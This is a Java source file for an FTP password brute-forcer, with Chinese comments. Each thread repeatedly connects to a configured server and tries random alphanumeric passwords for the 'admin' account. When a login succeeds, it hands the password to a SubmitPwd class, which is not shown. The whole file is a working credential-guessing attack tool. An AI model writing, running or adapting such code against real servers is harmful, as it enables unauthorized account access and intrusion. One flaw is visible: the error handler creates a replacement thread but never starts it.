import java.io.IOException;
import java.util.Random;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

public class LoginFtp extends Thread
{
	Integer num;// 密码位数
	Random random = new Random();
	static boolean finish = false;

	public LoginFtp(int num)
	{
		this.num = num;
	}

	@Override
	public void run()
	{
		FTPClient fClient = new FTPClient();
		for (;;)
		{
			try
			{
				if (finish)
					break;
				fClient.connect(Main.FTP_ADDRESS, Main.FTP_PORT);
				System.out.println("连接ftp...");
				String pwd = GetRandString(num);
				System.out.println("尝试:" + pwd);
				fClient.login("admin", pwd);
				if (FTPReply.isPositiveCompletion(fClient.getReplyCode()))
				{
					System.out.println("成功获取密码");
					finish = true;
					new SubmitPwd(pwd).start();
					break;
				}
				else
					System.out.println("不正确...");
				fClient.disconnect();
				System.out.println("断开ftp...\n");
			}
			catch (IOException e)
			{
				System.out.println("发生错误,启动新线程");
				new LoginFtp(num);
				break;
			}
		}
		super.run();
	}

	// 随机生成指定位数的密码
	String GetRandString(int count)
	{
		String str = "";
		for (int i = 1; i <= count; i++)
		{
			str += (GetRandChar() + "");
		}
		return str;
	}

	// 获取随机字符
	char GetRandChar()
	{
		int c = random.nextInt(62);
		if (c <= 9)// 0-9>>[0-9]
		{
			c += '0';
		}
		else if (c < 36)// a-z>>[10,35]
		{
			c += ('a' - 10);
		}
		else if (c < 62)// A-Z>>[36,61]
		{
			c += ('A' - 36);
		}
		return (char) c;
	}
}
